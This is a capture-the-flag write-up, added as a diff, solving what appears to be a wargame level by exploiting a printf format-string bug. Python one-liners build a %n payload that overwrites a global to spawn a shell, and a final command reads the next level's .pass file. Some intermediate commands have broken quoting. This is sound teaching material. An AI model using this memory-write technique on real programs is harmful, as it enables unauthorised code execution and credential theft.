@@ -1,0 +1,55 @@
+*** LEVEL3 SOLUTION ***
+*** Please note all text inside back-ticks (``) are commands.
+*** Enter these command on the command line.
+
+# There is no buffer overflow vulnrability in this program.
+# There is a Format String vulnrability.
+  ______________________________________________________
+    0x080484cc <+40>:	lea    eax,[ebp-0x208]
+    0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
+ => 0x080484d5 <+49>:	call   0x8048390 <printf@plt> <=
+  ______________________________________________________
+
+# We can see that a value from the .bss section is loaded into $eax
+  ______________________________________________________
+    0x080484da <+54>:	mov => eax,ds:0x804988c <=
+  ______________________________________________________
+
+# Closer look shows a cmp instruction with the value of $eax and 0x40
+  ______________________________________________________
+    0x080484df <+59>:	cmp    eax,0x40
+  ______________________________________________________
+
+# After cmp there is jmp
+  * If the previous cmp validates to true, the program will continue
+  * If its not it will jump to <v+116> and leave + return
+  ______________________________________________________
+    0x080484e2 <+62>:	jne    0x8048518 <v+116>
+  _____________________________________________________
+
+# We want to somehow set the value at the memory address 0x804988c to 0x40 (64)
+  * I we do that, we will allow the function <system> to run and opena shell
+# First we need to print the memory address that w want to modify through printf
+  `python -c 'print "\x8c\x98\x04\x08"'`
+
+# Now we start trying to write a value to that address.
+  * We will use the %n modifier to insert the value into our memory address.
+  * %n will insert the number of chars printed before it.
+  `python -c 'print "\x8c\x98\x04\x08" + "a"* 60' + "%n"'`
+
+  * Now the number 60 will be stored in our memory address
+  * All we need to do is add 4
+  `python -c 'print "\x8c\x98\x04\x08" + "a"* 60' + "%4\$n"'`
+
+# Pipe our payload into a file
+  `python -c 'print "\x8c\x98\x04\x08" + "%60x%4$n"' > /tmp/payload3.txt`
+
+# Execute our payload
+  `cat /tmp/payload3.txt - | ./level3`
+
+# Cat .pass file
+  `cat /home/user/level4/.pass`
+  
+
+  
+
